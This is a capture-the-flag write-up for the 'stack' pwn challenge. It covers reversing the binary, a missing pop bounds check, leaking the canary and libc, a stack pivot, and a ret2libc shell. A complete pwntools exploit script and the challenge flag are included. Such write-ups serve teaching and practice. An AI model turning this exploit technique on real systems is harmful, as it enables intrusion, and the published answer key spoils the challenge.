# PHM #73 Pwn — stack

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 200 |
| 保護 | NX / PIE / Full RELRO / Canary (全開) |
| Flag | `FLAG{N0W_Y0U_R_7he_St4ck_1eak1ng_Ma5t3r_w17h_5upeR_P0W3RRrrrrrrrrrr}` |

## 題目

> `nc ctf.hackme.quest 7716`, "Here is my C programming homework"
>
> Binary: [`/static/stack`](https://ctf.hackme.quest/static/stack), Source: [`/static/stack.c`](https://ctf.hackme.quest/static/stack.c)

Source 是個簡單的 int stack — `i N` push, `p` pop, `c` clear. 選單文字只給 3 個指令, 編譯出來的 binary 多了 `x` (exit) 跟 `f` (印 "flag" 字串, troll).

```c
struct stack { int n; int data[4096]; };     // source 寫 4096
void stack_push(struct stack *s, int val) { s->data[s->n++] = val; }
int  stack_pop (struct stack *s)           { return s->data[--s->n]; }
```

## 分析 — Analysis

### 1. Binary 用 source **註解掉**的版本編的

Source 跟 binary 兩個關鍵差異:

| 項目 | source | binary |
|:---|:---|:---|
| `data[]` 大小 | `data[4096]` | **`data[64]`** (註解版) |
| pop 有無 `s.n > 0` check | 有 | **沒有** (註解版) |

從 disasm 推出來: main `rep stos ecx=0x41` 只初始化 260 bytes = `sizeof(int) + 64*sizeof(int)`, 跟 `data[64]` 大小吻合, 不是 `data[4096]` 的 16KB. `stack_pop` 的 disasm 也沒有 `s.n > 0` 的比較分支.

> [!IMPORTANT]
> 這題不能只讀 source, 一定要反組譯驗證. 兩個「被註解掉的」版本才是真正跑的程式.

### 2. 關鍵 primitive — pop-then-push 任意控 `s.n`

反組譯 `stack_push`:

```
read s.n → N
write s.n ← N+1       ← increment 先寫回去
write s.data[N] ← val  ← 再寫 data
```

若先 `pop` 讓 `s.n = -1` (無 check), 接著 `push V`:
1. 讀 `s.n = -1`
2. 寫 `s.n = 0` (增量)
3. 寫 `s.data[-1] = V` ← `s.data[-1]` 位址 = `&s + 4 + (-1)*4 = &s`, 正是 `s.n` 的位置, V 覆蓋掉剛剛的 0

**最終 `s.n = V`** — 任意值. 拿到任意 index read/write.

### 3. 關鍵位址都在 `s.data[k]` 可以踩到

從 `main` 的 stack frame 推出:

| k | 位址 (相對 `ebp`) | 內容 |
|---:|:---|:---|
| 80 | `ebp-0x1c`  | **canary** |
| 84 | `ebp-0xc`   | 存的 `ecx` (prologue `push ecx`) |
| 85 | `ebp-0x8`   | 存的 `ebx` |
| 86 | `ebp-0x4`   | 存的 `edi` |
| 87 | `ebp`       | 存的 `ebp` |
| 88 | `ebp+4`     | **saved return addr** (跳回 `__libc_start_main`) |

### 4. Main epilogue 做 stack pivot — 覆蓋 saved `ecx` 就能控 esp

```
lea esp, [ebp-0xc]
pop ecx          ; 從 s.data[84] 拿 ecx
pop ebx          ; s.data[85]
pop edi          ; s.data[86]
pop ebp          ; s.data[87]
lea esp, [ecx-4] ; ← esp 被我們覆寫的 ecx 控制
ret              ; 從 [esp] = [ecx-4] 拿 return addr
```

**覆寫 `s.data[84] = X`**, 接著 `ret` 會從 `[X-4]` 拿 RIP. 等於可以 pivot 到任意位址.

### 5. 需要三個 leak + 推一條地址

- **canary** (`s.data[80]`): 不能亂寫, 不然 canary check 爆
- **saved return addr** (`s.data[88]`): = `__libc_start_main + 0x18637`, 推 libc base
- **saved ecx value** (`s.data[84]`): 推 `s.data[0]` 絕對位址

Saved `ecx` 的 VALUE = main 進入時 `esp+4` (呼叫端 `__libc_start_main` 的 stack 位置). 假設呼叫端 esp 16-aligned (常態):

```
main_ebp     = (esp_entry - 4) & ~15 - 4  = saved_ecx - 0x18
s.data[0]    = main_ebp - 0x15c            = saved_ecx - 0x174
```

gdb 實測吻合 → **`&s.data[0] = saved_ecx_VALUE - 0x174`**.

## 解法 — Exploit

ROP chain 塞在 `s.data[0..2]`, pivot target 設到那邊:

```
s.data[0]  = system
s.data[1]  = 0xDEADBEEF (dummy ret, system 不會真的回來)
s.data[2]  = &"/bin/sh"
s.data[80] = canary (原值寫回, 不能動)
s.data[84] = &s.data[0] + 4   ← pivot target
```

`x` 觸發 main return → canary 檢查過 → epilogue 拿到我們的 `ecx = sdata0+4` → `lea esp, [ecx-4] = sdata0` → `ret` pops `s.data[0] = system` → `system("/bin/sh")`.

### Exploit 腳本

```python
#!/usr/bin/env python3
from pwn import process, remote, context, ELF
import re, sys, time

context.log_level = 'error'
context.arch = 'i386'
REMOTE = len(sys.argv) > 1 and sys.argv[1] == 'remote'

if REMOTE:
    libc = ELF('./libc-2.23.so.i386')
    LIBC_RET_OFFSET = 0x18637  # 緊接著 __libc_start_main 的 `call *0x70(%esp)`
    p = remote('ctf.hackme.quest', 7716)
else:
    libc = ELF('/lib32/libc.so.6')
    p = process('./stack')

def signed32(v):
    v &= 0xFFFFFFFF
    return v if v < 2**31 else v - 2**32

def push_val(acc, val):
    acc.append(b'i'); acc.append(str(signed32(val)).encode())
def set_n(acc, val):
    acc.append(b'p'); acc.append(b'i'); acc.append(str(signed32(val)).encode())
def pop_cmd(acc):
    acc.append(b'p')

# ===== Phase 1: 一次 send 完所有 leak 操作, 回頭 parse =====
cmds = []
set_n(cmds, 81);          pop_cmd(cmds)              # idx 1  → canary
for _ in range(80): pop_cmd(cmds)                    # drain n → 0
set_n(cmds, 89);          pop_cmd(cmds)              # idx 83 → saved RIP
for _ in range(88): pop_cmd(cmds)
set_n(cmds, 85);          pop_cmd(cmds)              # idx 173 → saved ecx

p.send(b'\n'.join(cmds) + b'\n')
time.sleep(0.5)
out = b''
for _ in range(20):
    try:
        c = p.recv(timeout=0.3)
        if not c: break
        out += c
    except: break

pops = re.findall(rb'Pop -> (-?\d+)', out)
canary    = int(pops[1])   & 0xFFFFFFFF
saved_rip = int(pops[83])  & 0xFFFFFFFF
saved_ecx = int(pops[173]) & 0xFFFFFFFF

libc_base   = saved_rip - LIBC_RET_OFFSET
system_addr = libc_base + libc.symbols['system']
binsh       = libc_base + next(libc.search(b'/bin/sh\x00'))
sdata0      = saved_ecx - 0x174

# ===== Phase 2: 寫 ROP + 覆寫 saved_ecx, 觸發 'x' =====
cmds2 = [b'c']                                 # s.n = 0
push_val(cmds2, system_addr)                   # s.data[0]
push_val(cmds2, 0xDEADBEEF)                    # s.data[1]
push_val(cmds2, binsh)                         # s.data[2]
for _ in range(77): push_val(cmds2, 0x41414141)  # s.data[3..79]
push_val(cmds2, canary)                        # s.data[80] canary 原值
for _ in range(3):  push_val(cmds2, 0x42424242)  # s.data[81..83]
push_val(cmds2, sdata0 + 4)                    # s.data[84] saved_ecx
cmds2.append(b'x')

p.send(b'\n'.join(cmds2) + b'\n')
time.sleep(0.7)

p.sendline(b'cat /home/*/flag* /flag* 2>/dev/null')
print(p.recv(timeout=3).decode(errors='replace'))
```

跑出來:

```
Bye
FLAG{N0W_Y0U_R_7he_St4ck_1eak1ng_Ma5t3r_w17h_5upeR_P0W3RRrrrrrrrrrr}
```

## 兩個踩過的坑 — Gotchas

1. **`scanf("%d")` 是 signed int, 大於 `INT_MAX` 會被 clip 到 `0x7FFFFFFF`**. system 地址 / canary 值常常 > `INT_MAX`, 一定要轉成**有號十進位** (= `v - 2**32` if `v >= 2**31`) 才能原值傳進去. 不然 canary 寫錯 → stack smash 爆.
2. **本地測試 libc 版本不同**: PHM 題給的是 libc 2.23, Ubuntu 24.04 系統是 2.34, `__libc_start_main` 內部 `call main` 的 offset 不一樣. 本地驗 primitive 可以直接從 `/proc/<pid>/maps` 讀 libc base 繞過; remote 必須用題目給的 libc 的 offset `0x18637`.

## Sources

- [PHM scoreboard — stack](https://ctf.hackme.quest/scoreboard/?id=73)
- `/static/stack`, `/static/stack.c`, `/static/libc-2.23.so.i386.xz`
